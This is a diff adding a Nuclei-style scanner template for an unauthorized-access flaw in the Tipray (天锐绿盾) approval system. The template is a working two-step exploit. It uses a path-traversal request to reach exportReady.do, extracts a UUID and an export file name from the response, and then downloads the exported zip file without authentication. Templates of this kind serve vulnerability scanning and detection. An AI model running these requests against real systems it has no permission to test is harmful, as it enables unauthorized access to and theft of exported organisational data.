@@ -1,0 +1,67 @@
+id: poc-yaml-tipray-gsas-exportready-do-unauthorized-access
+
+info:
+  name: 天锐绿盾审批系统 exportReady.do 未授权访问漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: unauthorized-access
+  description: |
+    Unauthorized access vulnerability in exportReady.do endpoint of 天锐绿盾审批系统.
+
+http:
+  - raw:
+      - |
+        GET /trwfe/login.jsp/.%2e/config/exportReady.do HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: uuid
+        internal: true
+        group: 0
+        part: body
+        regex:
+          - "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"
+      - type: regex
+        name: file
+        internal: true
+        group: 1
+        part: body
+        regex:
+          - "export(.*?).zip"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: header
+        words:
+          - "Path=/trwfe"
+      - type: word
+        part: body
+        words:
+          - ".zip"
+      - type: regex
+        part: body
+        regex:
+          - "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+
+  - raw:
+      - |
+        GET /trwfe/{{uuid}}/export{{file}}.zip HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: header
+        words:
+          - "application/zip"
